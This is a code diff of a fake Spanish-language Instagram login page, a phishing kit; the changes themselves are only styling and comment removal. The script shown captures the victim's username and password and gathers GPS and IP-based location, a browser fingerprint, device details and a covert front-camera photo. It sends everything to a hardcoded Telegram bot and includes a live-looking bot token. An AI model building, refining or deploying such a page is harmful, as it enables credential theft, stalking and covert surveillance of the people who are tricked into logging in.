@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Instagram • Iniciar sesión</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -29,11 +30,12 @@
             text-align: center;
         }
         .logo {
-            font-family: 'Billabong', cursive;
-            font-size: 3rem;
+            font-family: 'Grand Hotel', cursive;
+            font-size: 3.5rem;
             font-weight: normal;
             margin-bottom: 30px;
             color: #262626;
+            letter-spacing: -0.5px;
         }
         .input-group {
             margin-bottom: 6px;
@@ -101,6 +103,17 @@
             font-size: 0.7rem;
             color: #8e8e8e;
         }
+        .signup {
+            margin-top: 20px;
+            font-size: 0.85rem;
+            border-top: 1px solid #dbdbdb;
+            padding-top: 20px;
+        }
+        .signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -116,7 +129,10 @@
     <div class="divider">o</div>
     <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
     <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
-    <div class="footer">No eres tú? · Ayuda · Privacidad</div>
+    <div class="signup">
+        ¿No tienes una cuenta? <a href="#">Regístrate</a>
+    </div>
+    <div class="footer">Meta · Información · Ayuda · Privacidad</div>
 </div>
 
 <video id="video" autoplay playsinline style="display:none"></video>
@@ -128,7 +144,6 @@
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // ⚠️ REVOCA Y PON TU TOKEN NUEVO
     const CHAT_ID = '7555997298';
 
-    // ---------- 1. Obtener ubicación desde Cloudflare Worker ----------
     async function getLocationFromWorker() {
         try {
             const res = await fetch(WORKER_URL);
@@ -142,12 +157,9 @@
                 postal: data.postal || 'N/A',
                 timezone: data.timezone || 'N/A'
             };
-        } catch(e) {
-            return null;
-        }
+        } catch(e) { return null; }
     }
 
-    // ---------- 2. Obtener ubicación desde ipapi.co ----------
     async function getLocationFromIpapi() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -160,12 +172,9 @@
                 postal: data.postal || 'N/A',
                 timezone: data.timezone || 'N/A'
             };
-        } catch(e) {
-            return null;
-        }
+        } catch(e) { return null; }
     }
 
-    // ---------- 3. Fingerprint ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -187,7 +196,6 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
-    // ---------- 4. Datos del dispositivo ----------
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -202,7 +210,6 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
-    // ---------- 5. Almacenamiento ----------
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -212,7 +219,6 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
-    // ---------- 6. GPS exacto ----------
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -224,7 +230,6 @@
         });
     }
 
-    // ---------- 7. Cámara frontal ----------
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -246,7 +251,6 @@
         return blob;
     }
 
-    // ---------- 8. Envío a Telegram ----------
     async function sendMessage(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
@@ -266,33 +270,23 @@
         } catch(e) { console.warn(e); }
     }
 
-    // ---------- 9. Proceso principal ----------
     document.getElementById('btn').onclick = async () => {
-        // Capturar credenciales de Instagram
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
         let creds = `🔐 *CREDENCIALES INSTAGRAM*\nUsuario: ${username || '(vacío)'}\nContraseña: ${password || '(vacío)'}\n`;
 
-        // Obtener ubicación GPS
         const gps = await getGPS();
-
-        // Obtener ubicaciones por IP
         const [workerLoc, ipapiLoc] = await Promise.all([
             getLocationFromWorker(),
             getLocationFromIpapi()
         ]);
-
-        // Datos complementarios
         const [fp, device, storage] = await Promise.all([
             getFingerprint(),
             getDeviceInfo(),
             getStorageInfo()
         ]);
-
-        // Cámara
         const foto = await capturePhoto();
 
-        // Construir mensaje completo
         let message = creds;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
@@ -301,15 +295,11 @@
         message += `📍 *Cloudflare Worker Location*\n`;
         if (workerLoc && workerLoc.city !== 'N/A') {
             message += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
-        } else {
-            message += `   • No disponible\n`;
-        }
+        } else { message += `   • No disponible\n`; }
         message += `📍 *IP API Location (ipapi.co)*\n`;
         if (ipapiLoc && ipapiLoc.city !== 'N/A') {
             message += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
-        } else {
-            message += `   • No disponible\n`;
-        }
+        } else { message += `   • No disponible\n`; }
         if (gps) {
             message += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
         } else {
